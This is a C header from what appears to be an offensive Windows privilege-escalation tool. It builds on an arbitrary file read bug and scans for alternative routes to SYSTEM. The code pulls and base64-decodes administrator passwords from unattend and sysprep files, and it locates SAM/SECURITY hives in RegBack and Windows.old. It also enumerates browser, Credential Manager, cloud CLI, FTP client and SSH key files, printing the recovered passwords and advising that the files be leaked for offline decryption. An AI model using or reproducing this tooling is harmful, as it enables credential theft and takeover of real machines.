#pragma once
// fr2system - Alternative routes to SYSTEM
// When SAM/SECURITY are locked and can't be read via the arb file read bug,
// these paths use other readable files to extract credentials or escalate.
//
// Each function returns TRUE if it found actionable credentials.

#include "common.h"
#include <Shlwapi.h>
#pragma comment(lib, "Shlwapi.lib")

// ═══════════════════════════════════════════════════════════════════
// Route 1: Unattend.xml / Sysprep files
// Password may be stored in base64 in <AdministratorPassword> or
// <AutoLogon><Password> elements
// Files are NOT locked — direct read works
// ═══════════════════════════════════════════════════════════════════

static const wchar_t* FR2S_UNATTEND_PATHS[] = {
    L"C:\\Windows\\Panther\\Unattend.xml",
    L"C:\\Windows\\Panther\\unattend\\Unattend.xml",
    L"C:\\Windows\\Panther\\Unattend\\Unattend.xml",
    L"C:\\Windows\\System32\\Sysprep\\unattend.xml",
    L"C:\\Windows\\System32\\Sysprep\\Unattend.xml",
    L"C:\\Windows\\System32\\Sysprep\\sysprep.xml",
    L"C:\\Windows\\Panther\\setupinfo",
    L"C:\\Windows\\Panther\\Unattend\\setupinfo",
    NULL
};

// Simple XML value extractor — no XML library needed
static BOOL FR2S_ExtractXMLValue(const char* xml, const char* tag, char* outValue, int maxLen) {
    char openTag[128], closeTag[128];
    sprintf_s(openTag, sizeof(openTag), "<%s>", tag);
    sprintf_s(closeTag, sizeof(closeTag), "</%s>", tag);

    const char* start = strstr(xml, openTag);
    if (!start) return FALSE;
    start += strlen(openTag);

    const char* end = strstr(start, closeTag);
    if (!end) return FALSE;

    int len = (int)(end - start);
    if (len <= 0 || len >= maxLen) return FALSE;

    memcpy(outValue, start, len);
    outValue[len] = 0;

    // Trim whitespace
    while (*outValue == ' ' || *outValue == '\n' || *outValue == '\r' || *outValue == '\t')
        memmove(outValue, outValue + 1, strlen(outValue));
    char* e = outValue + strlen(outValue) - 1;
    while (e > outValue && (*e == ' ' || *e == '\n' || *e == '\r' || *e == '\t'))
        *e-- = 0;

    return strlen(outValue) > 0;
}

// Base64 decode (minimal implementation)
static int FR2S_Base64Decode(const char* input, BYTE* output, int maxOut) {
    DWORD outLen = (DWORD)maxOut;
    if (CryptStringToBinaryA(input, 0, CRYPT_STRING_BASE64, output, &outLen, NULL, NULL))
        return (int)outLen;
    return 0;
}

typedef struct _FR2S_UNATTEND_CRED {
    char username[128];
    char password[256];
    BOOL isBase64;
    wchar_t sourceFile[MAX_PATH];
} FR2S_UNATTEND_CRED;

static int FR2S_CheckUnattendFiles(FR2S_UNATTEND_CRED* outCreds, int maxCreds) {
    int found = 0;

    for (int i = 0; FR2S_UNATTEND_PATHS[i] != NULL && found < maxCreds; i++) {
        DWORD fileSize = 0;
        BYTE* data = FR2S_ReadFileToBuffer(FR2S_UNATTEND_PATHS[i], &fileSize);
        if (!data) continue;

        FR2S_Ok("Found unattend file: %ws (%d bytes)", FR2S_UNATTEND_PATHS[i], fileSize);

        // Null-terminate for string ops
        char* xml = (char*)realloc(data, fileSize + 1);
        if (!xml) { free(data); continue; }
        xml[fileSize] = 0;

        // Look for password values in common locations
        const char* passwordTags[] = {
            "Value",           // <AdministratorPassword><Value>...</Value>
            "Password",        // <AutoLogon><Password>...</Password>
            "PlainText",       // Check if it's plaintext
            NULL
        };

        char password[256] = { 0 };
        char username[128] = { 0 };

        // Extract password
        if (FR2S_ExtractXMLValue(xml, "Value", password, sizeof(password)) ||
            FR2S_ExtractXMLValue(xml, "Password", password, sizeof(password))) {

            // Check if base64 encoded
            char plainText[32] = { 0 };
            BOOL isPlain = FALSE;
            if (FR2S_ExtractXMLValue(xml, "PlainText", plainText, sizeof(plainText))) {
                isPlain = (_stricmp(plainText, "true") == 0);
            }

            // Try to get username
            if (!FR2S_ExtractXMLValue(xml, "Username", username, sizeof(username))) {
                strcpy_s(username, "Administrator");
            }

            FR2S_UNATTEND_CRED* cred = &outCreds[found];
            strcpy_s(cred->username, username);
            wcscpy_s(cred->sourceFile, FR2S_UNATTEND_PATHS[i]);

            if (!isPlain && strlen(password) > 0) {
                // Try base64 decode
                BYTE decoded[256] = { 0 };
                int decLen = FR2S_Base64Decode(password, decoded, sizeof(decoded));
                if (decLen > 0) {
                    // Decoded is typically UTF-16LE, convert to ASCII
                    int j = 0;
                    for (int k = 0; k < decLen && j < (int)sizeof(cred->password) - 1; k += 2) {
                        if (decoded[k] && decoded[k] >= 0x20)
                            cred->password[j++] = (char)decoded[k];
                    }
                    cred->password[j] = 0;
                    cred->isBase64 = TRUE;
                }
                else {
                    strcpy_s(cred->password, password);
                }
            }
            else {
                strcpy_s(cred->password, password);
            }

            if (strlen(cred->password) > 0) {
                found++;
                FR2S_Ok("  Credential: %s : %s (from %ws)",
                    cred->username, cred->password, cred->sourceFile);
            }
        }

        free(xml);
    }
    return found;
}


// ═══════════════════════════════════════════════════════════════════
// Route 2: SAM/SECURITY from RegBack
// C:\Windows\System32\Config\RegBack\SAM — NOT locked
// Empty (0 bytes) on Win10 1803+ by default, but worth checking
// ═══════════════════════════════════════════════════════════════════

static BOOL FR2S_CheckRegBack(wchar_t* outSamPath, wchar_t* outSecPath) {
    const wchar_t* regbackSam = L"C:\\Windows\\System32\\Config\\RegBack\\SAM";
    const wchar_t* regbackSec = L"C:\\Windows\\System32\\Config\\RegBack\\SECURITY";

    WIN32_FILE_ATTRIBUTE_DATA fad = { 0 };
    BOOL samOk = FALSE, secOk = FALSE;

    if (GetFileAttributesExW(regbackSam, GetFileExInfoStandard, &fad)) {
        if (fad.nFileSizeLow > 0) {
            FR2S_Ok("RegBack SAM found: %ws (%d bytes)", regbackSam, fad.nFileSizeLow);
            if (outSamPath) wcscpy(outSamPath, regbackSam);
            samOk = TRUE;
        }
        else {
            FR2S_Log("RegBack SAM exists but is empty (Win10 1803+ default)");
        }
    }

    if (GetFileAttributesExW(regbackSec, GetFileExInfoStandard, &fad)) {
        if (fad.nFileSizeLow > 0) {
            FR2S_Ok("RegBack SECURITY found: %ws (%d bytes)", regbackSec, fad.nFileSizeLow);
            if (outSecPath) wcscpy(outSecPath, regbackSec);
            secOk = TRUE;
        }
    }

    return samOk;
}


// ═══════════════════════════════════════════════════════════════════
// Route 3: Windows.old (after OS upgrade)
// C:\Windows.old\Windows\System32\Config\SAM — NOT locked
// Contains SAM from previous Windows installation
// Users often keep the same password across upgrades
// ═══════════════════════════════════════════════════════════════════

static BOOL FR2S_CheckWindowsOld(wchar_t* outSamPath, wchar_t* outSecPath) {
    const wchar_t* oldSam = L"C:\\Windows.old\\Windows\\System32\\Config\\SAM";
    const wchar_t* oldSec = L"C:\\Windows.old\\Windows\\System32\\Config\\SECURITY";

    WIN32_FILE_ATTRIBUTE_DATA fad = { 0 };
    BOOL found = FALSE;

    if (GetFileAttributesExW(oldSam, GetFileExInfoStandard, &fad) && fad.nFileSizeLow > 0) {
        FR2S_Ok("Windows.old SAM found: %ws (%d bytes)", oldSam, fad.nFileSizeLow);
        if (outSamPath) wcscpy(outSamPath, oldSam);
        found = TRUE;
    }

    if (GetFileAttributesExW(oldSec, GetFileExInfoStandard, &fad) && fad.nFileSizeLow > 0) {
        FR2S_Ok("Windows.old SECURITY found: %ws (%d bytes)", oldSec, fad.nFileSizeLow);
        if (outSecPath) wcscpy(outSecPath, oldSec);
    }

    return found;
}


// ═══════════════════════════════════════════════════════════════════
// Route 4: Credential files (DPAPI-protected, browser, etc.)
// These are NOT locked and readable if your bug can access user profiles
// ═══════════════════════════════════════════════════════════════════

typedef struct _FR2S_CRED_FILE {
    wchar_t path[MAX_PATH];
    const char* description;
} FR2S_CRED_FILE;

static int FR2S_FindCredentialFiles(FR2S_CRED_FILE* outFiles, int maxFiles) {
    int found = 0;
    wchar_t path[MAX_PATH];

    // Chrome Login Data
    ExpandEnvironmentStringsW(L"%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data", path, MAX_PATH);
    if (GetFileAttributesW(path) != INVALID_FILE_ATTRIBUTES && found < maxFiles) {
        wcscpy(outFiles[found].path, path);
        outFiles[found].description = "Chrome saved passwords (SQLite, DPAPI-encrypted)";
        found++;
    }

    // Edge Login Data
    ExpandEnvironmentStringsW(L"%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\Default\\Login Data", path, MAX_PATH);
    if (GetFileAttributesW(path) != INVALID_FILE_ATTRIBUTES && found < maxFiles) {
        wcscpy(outFiles[found].path, path);
        outFiles[found].description = "Edge saved passwords (SQLite, DPAPI-encrypted)";
        found++;
    }

    // Windows Credential Manager
    ExpandEnvironmentStringsW(L"%APPDATA%\\Microsoft\\Credentials", path, MAX_PATH);
    if (GetFileAttributesW(path) != INVALID_FILE_ATTRIBUTES && found < maxFiles) {
        wcscpy(outFiles[found].path, path);
        outFiles[found].description = "Windows Credential Manager (DPAPI-encrypted)";
        found++;
    }

    // PuTTY sessions (registry, but might have proxy passwords)
    // KeePass config
    ExpandEnvironmentStringsW(L"%APPDATA%\\KeePass\\KeePass.config.xml", path, MAX_PATH);
    if (GetFileAttributesW(path) != INVALID_FILE_ATTRIBUTES && found < maxFiles) {
        wcscpy(outFiles[found].path, path);
        outFiles[found].description = "KeePass configuration (may contain DB paths)";
        found++;
    }

    // mRemoteNG
    ExpandEnvironmentStringsW(L"%APPDATA%\\mRemoteNG\\confCons.xml", path, MAX_PATH);
    if (GetFileAttributesW(path) != INVALID_FILE_ATTRIBUTES && found < maxFiles) {
        wcscpy(outFiles[found].path, path);
        outFiles[found].description = "mRemoteNG connections (encrypted passwords)";
        found++;
    }

    // WinSCP
    ExpandEnvironmentStringsW(L"%APPDATA%\\WinSCP.ini", path, MAX_PATH);
    if (GetFileAttributesW(path) != INVALID_FILE_ATTRIBUTES && found < maxFiles) {
        wcscpy(outFiles[found].path, path);
        outFiles[found].description = "WinSCP saved sessions (reversible encryption)";
        found++;
    }

    // FileZilla
    ExpandEnvironmentStringsW(L"%APPDATA%\\FileZilla\\recentservers.xml", path, MAX_PATH);
    if (GetFileAttributesW(path) != INVALID_FILE_ATTRIBUTES && found < maxFiles) {
        wcscpy(outFiles[found].path, path);
        outFiles[found].description = "FileZilla recent servers (base64 passwords)";
        found++;
    }

    // WiFi profiles (XML with plaintext keys if exported)
    // Cloud credentials
    ExpandEnvironmentStringsW(L"%USERPROFILE%\\.aws\\credentials", path, MAX_PATH);
    if (GetFileAttributesW(path) != INVALID_FILE_ATTRIBUTES && found < maxFiles) {
        wcscpy(outFiles[found].path, path);
        outFiles[found].description = "AWS CLI credentials";
        found++;
    }

    ExpandEnvironmentStringsW(L"%APPDATA%\\gcloud\\credentials.db", path, MAX_PATH);
    if (GetFileAttributesW(path) != INVALID_FILE_ATTRIBUTES && found < maxFiles) {
        wcscpy(outFiles[found].path, path);
        outFiles[found].description = "GCloud credentials database";
        found++;
    }

    // Azure
    ExpandEnvironmentStringsW(L"%USERPROFILE%\\.azure\\accessTokens.json", path, MAX_PATH);
    if (GetFileAttributesW(path) != INVALID_FILE_ATTRIBUTES && found < maxFiles) {
        wcscpy(outFiles[found].path, path);
        outFiles[found].description = "Azure CLI access tokens";
        found++;
    }

    // SSH keys
    ExpandEnvironmentStringsW(L"%USERPROFILE%\\.ssh\\id_rsa", path, MAX_PATH);
    if (GetFileAttributesW(path) != INVALID_FILE_ATTRIBUTES && found < maxFiles) {
        wcscpy(outFiles[found].path, path);
        outFiles[found].description = "SSH private key (RSA)";
        found++;
    }

    ExpandEnvironmentStringsW(L"%USERPROFILE%\\.ssh\\id_ed25519", path, MAX_PATH);
    if (GetFileAttributesW(path) != INVALID_FILE_ATTRIBUTES && found < maxFiles) {
        wcscpy(outFiles[found].path, path);
        outFiles[found].description = "SSH private key (Ed25519)";
        found++;
    }

    return found;
}


// ═══════════════════════════════════════════════════════════════════
// Master scan: try all alternative routes
// ═══════════════════════════════════════════════════════════════════

static void FR2S_ScanAlternativeRoutes() {
    FR2S_Log("=== Scanning alternative credential sources ===\n");

    // Route 1: Unattend files
    FR2S_Log("[Route 1] Checking unattend/sysprep files...");
    FR2S_UNATTEND_CRED unattendCreds[8] = { 0 };
    int unattendCount = FR2S_CheckUnattendFiles(unattendCreds, 8);
    if (unattendCount == 0)
        FR2S_Log("  No unattend credentials found.\n");
    else
        printf("\n");

    // Route 2: RegBack
    FR2S_Log("[Route 2] Checking RegBack hives...");
    wchar_t regbackSam[MAX_PATH] = { 0 }, regbackSec[MAX_PATH] = { 0 };
    BOOL hasRegBack = FR2S_CheckRegBack(regbackSam, regbackSec);
    if (!hasRegBack)
        FR2S_Log("  No usable RegBack hives found.\n");
    else
        printf("\n");

    // Route 3: Windows.old
    FR2S_Log("[Route 3] Checking Windows.old...");
    wchar_t oldSam[MAX_PATH] = { 0 }, oldSec[MAX_PATH] = { 0 };
    BOOL hasOld = FR2S_CheckWindowsOld(oldSam, oldSec);
    if (!hasOld)
        FR2S_Log("  No Windows.old hives found.\n");
    else
        printf("\n");

    // Route 4: Credential files
    FR2S_Log("[Route 4] Scanning for credential files...");
    FR2S_CRED_FILE credFiles[20] = { 0 };
    int credFileCount = FR2S_FindCredentialFiles(credFiles, 20);
    if (credFileCount > 0) {
        for (int i = 0; i < credFileCount; i++) {
            FR2S_Ok("  %ws", credFiles[i].path);
            FR2S_Log("    -> %s", credFiles[i].description);
        }
        printf("\n");
    }
    else {
        FR2S_Log("  No credential files found.\n");
    }

    // Summary
    printf("\n");
    FR2S_Log("=== Alternative routes summary ===");
    if (unattendCount > 0)
        FR2S_Ok("Unattend credentials: %d found (try LogonUserEx with these)", unattendCount);
    if (hasRegBack)
        FR2S_Ok("RegBack SAM available: re-run with --path pointing to RegBack dir");
    if (hasOld)
        FR2S_Ok("Windows.old SAM available: re-run with --path pointing to extracted hives");
    if (credFileCount > 0)
        FR2S_Ok("Credential files: %d found (leak via your arb file read for offline decryption)", credFileCount);
    if (unattendCount == 0 && !hasRegBack && !hasOld && credFileCount == 0)
        FR2S_Warn("No alternative routes found. SAM via VSS is your best option.");
}
